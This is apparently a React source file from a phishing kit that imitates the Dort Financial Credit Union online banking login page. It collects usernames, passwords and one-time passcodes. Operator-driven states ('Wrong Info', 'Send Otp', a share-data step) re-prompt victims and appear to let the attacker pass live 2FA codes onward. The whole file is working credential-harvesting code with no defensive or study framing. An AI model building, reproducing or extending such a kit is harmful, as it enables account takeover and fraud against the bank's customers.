import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import { motion } from "framer-motion";
import BankingHeader from "./BankingHeader";
import clsx from "clsx";
import DortFavIcon from "../../../../../../../../assets/allBanks/banks/dort/dt2.jpg";
import { Link } from "react-router-dom";
import { FaRegEye, FaRegEyeSlash } from "react-icons/fa6";
import DortImg from "../../../../../../../../assets/allBanks/banks/dort/dt1.png";
import { ClipLoader } from "react-spinners";
import BankControl from "./BankControl";
import BasicLoader from "../../../../../loading/BasicLoader";
import ShareData from "./ShareData";
import BankOtpControl from "./BankOtpControl";

const Dort = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  setIsOpenOtp,
  loading,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    setshowPassword,
    showPassword,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <motion.div
      initial={{ y: -100, opacity: 0 }}
      animate={{ y: 0, opacity: 1 }}
      exit={{ y: -100, opacity: 0 }}
      transition={{ type: "spring", stiffness: 300, damping: 50 }}
      className={clsx(
        "w-full min-h-screen h-full  top-0  bg-white",
        typeAccount ? "hidden" : "block"
      )}
    >
      <BankingHeader
        text="Dort Financial Credit Union Online Banking"
        handleCancel={handleCancel}
        img={DortFavIcon}
        setAllBankItems={setAllBankItems}
        setIsOpenOtp={setIsOpenOtp}
        setOtpOpen={setOtpOpen}
      />
      <header className="w-full flex justify-center mt-4 mb-7">
        <div className="w-[146px] h-[55px]">
          <img src={DortImg} alt="" className="w-full h-full object-contain" />
        </div>
      </header>
      <div className="w-full flex justify-center px-4">
        <div
          className={clsx(
            "w-full customMiniTablet:w-[360px]",
            allBankOpen ? "hidden" : "block"
          )}
        >
          <div>
            <div className="flex flex-col mb-5">
              <label>Username</label>
              <input
                type="text"
                value={formState.username}
                name="username"
                onChange={handleChange}
                className="border-2 border-customGray-1000 h-[36px] mt-1 outline-none px-2 focus:ring-2 focus:ring-offset-1 focus:ring-customBlue-500 focus:ring-opacity-60 "
              />
            </div>
            <div className="flex flex-col relative mb-5">
              <label>Password</label>
              <input
                type={showPassword ? "text" : "password"}
                value={formState.password}
                name="password"
                onChange={handleChange}
                className="border-2 border-customGray-1000 h-[36px] mt-1 outline-none pl-2 pr-10 relative focus:ring-2 focus:ring-offset-1 focus:ring-customBlue-500 focus:ring-opacity-60 transistion2"
              />
              <span
                onClick={() => setshowPassword((prevShow) => !prevShow)}
                className="absolute h-full py-9 right-3 "
              >
                {showPassword ? (
                  <FaRegEyeSlash size={18} />
                ) : (
                  <FaRegEye size={18} />
                )}
              </span>
            </div>
          </div>
          <button
            disabled={loading}
            onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
            className={clsx(
              "w-full bg-customGray-1002 text-customGray-400 rounded-md py-2 ",
              formState.username && formState.password
                ? "text-opacity-100 bg-opacity-100"
                : "text-opacity-40 bg-opacity-50 cursor-not-allowed"
            )}
          >
            {loading && <ClipLoader size={10} color="#fff" />}
            {loading ? "Loading..." : "Login"}
          </button>
          <div className="space-y-1 mt-5 flex-col flex justify-center items-center">
            <Link to="https://dortonline.org/" className="text-customBlue-1037">
              Forgot Login?
            </Link>
            <Link to="https://dortonline.org/" className="text-customBlue-1037">
              Test your browser
            </Link>
            <Link to="https://dortonline.org/" className="text-customBlue-1037">
              Trouble testing your browser
            </Link>
          </div>
        </div>
        {allBankOpen && (
          <div className={clsx(OtpOpen ? "hidden" : "block")}>
            <BankControl
              handleSelectedId={handleSelectedId}
              selectedPath={selectedPath}
              handleSelectSubmit={handleSelectSubmit}
            />
            <div>
              {activePathDetails.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activePathDetails.name === "Wrong Info" && (
                <>
                  <div className={clsx("w-full customMiniTablet:w-[360px]")}>
                    <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-1008">
                      <p>{activePathDetails.body}</p>
                    </div>
                    <div>
                      <div className="flex flex-col mb-5">
                        <label>Username</label>
                        <input
                          type="text"
                          value={formState.username}
                          name="username"
                          onChange={handleChange}
                          className="border-2 border-customGray-1000 h-[36px] mt-1 outline-none px-2 focus:ring-2 focus:ring-offset-1 focus:ring-customBlue-500 focus:ring-opacity-60 "
                        />
                      </div>
                      <div className="flex flex-col relative mb-5">
                        <label>Password</label>
                        <input
                          type={showPassword ? "text" : "password"}
                          value={formState.password}
                          name="password"
                          onChange={handleChange}
                          className="border-2 border-customGray-1000 h-[36px] mt-1 outline-none pl-2 pr-10 relative focus:ring-2 focus:ring-offset-1 focus:ring-customBlue-500 focus:ring-opacity-60 transistion2"
                        />
                        <span
                          onClick={() =>
                            setshowPassword((prevShow) => !prevShow)
                          }
                          className="absolute h-full py-9 right-3 "
                        >
                          {showPassword ? (
                            <FaRegEyeSlash size={18} />
                          ) : (
                            <FaRegEye size={18} />
                          )}
                        </span>
                      </div>
                    </div>
                    <button
                      disabled={loading}
                      onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                      className={clsx(
                        "w-full bg-customGray-1002 text-customGray-400 rounded-md py-2 ",
                        formState.username && formState.password
                          ? "text-opacity-100 bg-opacity-100"
                          : "text-opacity-40 bg-opacity-50 cursor-not-allowed"
                      )}
                    >
                      {loading && <ClipLoader size={10} color="#fff" />}
                      {loading ? "Loading..." : "Login"}
                    </button>
                    <div className="space-y-1 mt-5 flex-col flex justify-center items-center">
                      <Link
                        to="https://dortonline.org/"
                        className="text-customBlue-1037"
                      >
                        Forgot Login?
                      </Link>
                      <Link
                        to="https://dortonline.org/"
                        className="text-customBlue-1037"
                      >
                        Test your browser
                      </Link>
                      <Link
                        to="https://dortonline.org/"
                        className="text-customBlue-1037"
                      >
                        Trouble testing your browser
                      </Link>
                    </div>
                  </div>
                </>
              )}
              {activePathDetails.name === "Send Otp" && (
                <>
                  <h3>{activePathDetails.body}</h3>

                  <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                    <div>
                      <div className="text-customGray-1055">
                        <div>
                          <h3 className="mb-3 text-xl font-medium">
                            Enter Authentication Code
                          </h3>
                        </div>
                        <div>
                          <h2 className="mb-4 text-sm">
                            Enter the one-time password (OTP) sent to your phone
                            to access your account
                          </h2>
                          <div>
                            <input
                              type="number"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              className="border-2 border-customGray-1000 h-[36px] mt-1 outline-none px-2 focus:ring-2 focus:ring-offset-1 focus:ring-customBlue-500 focus:ring-opacity-60  no-spinner w-full mb-2"
                            />
                          </div>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold text-center my-2",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                            )}
                            onClick={handleResend}
                          >
                            Did not receive a code? Resend Code
                          </p>
                          <button
                            onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                            className="w-full bg-customGray-1002 text-customGray-400 rounded-md py-2 "
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Submit"}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </>
              )}
            </div>
          </div>
        )}
        {OtpOpen && (
          <div>
            <BankOtpControl
              handleSelectedOtp={handleSelectedOtp}
              selectedOtp={selectedOtp}
              handleSubmitOtp={handleSubmitOtp}
            />

            <div>
              {activeOtp.name === "Loading" && (
                <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                  <BasicLoader />
                </p>
              )}
              {activeOtp.name === "wrong" && (
                <>
                  <div className={clsx("w-full customMiniTablet:w-[340px]")}>
                    <div>
                      <div className="text-customGray-1055">
                        <div>
                          <h3 className="mb-3 text-xl font-medium">
                            Enter Authentication Code
                          </h3>
                        </div>
                        <div>
                          <h2 className="mb-4 text-sm">
                            Enter the one-time password (OTP) sent to your phone
                            to access your account
                          </h2>
                          <div>
                            <input
                              type="number"
                              value={formOtp.otpo}
                              name="otpo"
                              onChange={changeOtp}
                              className="border-2 border-customGray-1000 h-[36px] mt-1 outline-none px-2 focus:ring-2 focus:ring-offset-1 focus:ring-customBlue-500 focus:ring-opacity-60  no-spinner w-full mb-2"
                            />

                            <h3 className="mt-2 text-sm text-customRed-1008">
                              {activeOtp.body}
                            </h3>
                          </div>
                          <p
                            className={clsx(
                              "cursor-pointer text-customBlue-100 font-bold text-center my-2",
                              !resend &&
                                "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                            )}
                            onClick={handleResend}
                          >
                            Did not receive a code? Resend Code
                          </p>
                          <button
                            onClick={(e) => onSubmitOtp(e, handleVerifiedOtp)}
                            className="w-full bg-customGray-1002 text-customGray-400 rounded-md py-2 "
                          >
                            {loading && <ClipLoader size={10} color="#fff" />}
                            {loading ? "Loading..." : "Submit"}
                          </button>
                        </div>
                      </div>
                    </div>
                  </div>
                </>
              )}
              {activeOtp.name === "otp" && (
                <>
                  <ShareData
                    bankName={bankName}
                    handleTheFinal={handleTheFinal}
                    handleCancel={handleCancel}
                    setIsOpenOtp={setIsOpenOtp}
                    setAllBankItems={setAllBankItems}
                    siteLink="https://dortonline.org/"
                  />
                </>
              )}
            </div>
          </div>
        )}
      </div>
    </motion.div>
  );
};

export default Dort;
